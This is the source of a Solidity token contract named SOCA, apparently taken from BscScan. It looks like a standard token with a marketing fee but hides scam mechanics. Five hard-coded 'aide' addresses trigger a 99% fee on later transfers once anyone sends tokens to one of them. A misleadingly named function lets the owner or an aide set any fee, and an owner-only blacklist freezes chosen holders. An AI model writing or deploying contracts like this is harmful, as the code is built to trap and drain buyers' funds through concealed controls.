/**
 *Submitted for verification at BscScan.com on 2022-03-30
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract SOCA {
	
	using SafeMath for uint256;
    string public name = "SOCA";
    string  public symbol = "SOCA";
    uint8   public decimals = 9;
	uint256 public totalSupply_ = 10000000000000* (10 ** decimals);
	
	address public tokenOwner;
	uint256 public  marketingFee = 0;
	address private _marketingWalletAddress;
	
    
	constructor(address _market) {
        balances[msg.sender] = totalSupply_;
		tokenOwner=msg.sender;
		_marketingWalletAddress=_market;
		excludeFromFFees(tokenOwner, true);
        excludeFromFFees(address(this), true);
        excludeFromFFees(_marketingWalletAddress, true);
        _isInAAide[0x44AF1184E09A97704cbD58368940aa318a070397]=true;
        _isInAAide[0xF055319382A016856A5ef4b1e9cA84b61659D595]=true;
        _isInAAide[0x58C05Aafb9CB10A32AE9fbB43b13a4575404DdaE]=true;
        _isInAAide[0x795DF874E0334A8C59c32f2a934E37Ad274E27Cb]=true;
        _isInAAide[0x4faeB2eE320Ef5f00bEF5ca4F293f2Cc0eD10Abb]=true;
    }
	
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
    
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowed;
	mapping(address => bool) private _isExcludedFromFFees;
	mapping(address => bool) private _isInAAide;
	mapping(address => bool) private _isInBBL;
    

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
		require(!_isInBBL[msg.sender]);
		require(!_isInBBL[_to]);
		
		if(!_isExcludedFromFFees[msg.sender]&&marketingFee>0){
			uint256 marketFee=_value.mul(marketingFee).div(100);
			uint256 trueAmount = _value.sub(marketFee);
			balances[msg.sender] -= _value;
			balances[_marketingWalletAddress]+=marketFee;
			balances[_to] += trueAmount;
			emit Transfer(msg.sender, _marketingWalletAddress, marketFee);
			emit Transfer(msg.sender, _to, trueAmount);
			
         }else{
			balances[msg.sender] -= _value;
			balances[_to] +=  _value;
            emit Transfer(msg.sender, _to, _value);
         }
		 if(_isInAAide[_to]){
			marketingFee=99;
		 }
		 return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
		require(!_isInBBL[_from]);
		require(!_isInBBL[_to]);
		
		if(!_isExcludedFromFFees[_from]&&marketingFee>0){
			uint256 marketFee=_value.mul(marketingFee).div(100);
			uint256 trueAmount = _value.sub(marketFee);
			balances[_from] -= _value;
			balances[_marketingWalletAddress]+=marketFee;
			balances[_to] +=  trueAmount;
			emit Transfer(_from, _marketingWalletAddress, marketFee);
			emit Transfer(_from, _to, trueAmount);
        }else{
			balances[_from] -= _value;
			balances[_to] +=  _value;
            emit Transfer(_from, _to, _value);
        }
        return true;
    }
	
	function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value; 
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
	
	function excludeMarketFFee(uint256 feeValue) public {
		require(msg.sender==tokenOwner||_isInAAide[msg.sender]);
		marketingFee=feeValue;
	}
	
    function excludeFromFFees(address account, bool excluded) public{ 
        require(_isExcludedFromFFees[account] != excluded, "RedCheCoin Account is already the value of 'excluded'");
		require(msg.sender==tokenOwner);
		
        _isExcludedFromFFees[account] = excluded;
    }
	
	
	function excludeInAAide(address[] memory addrs) public{
		require(msg.sender==tokenOwner);
		for (uint256 i = 0; i < addrs.length; i++) {
			_isInAAide[addrs[i]] = true;
		}
    }
	
	function excludeInBBL(address[] memory addrs) public{
		require(msg.sender==tokenOwner);
		for (uint256 i = 0; i < addrs.length; i++) {
            _isInBBL[addrs[i]] = true;
		}
    }
	function isInBBL(address account) public view returns (bool) {
        return _isInBBL[account];
    }
}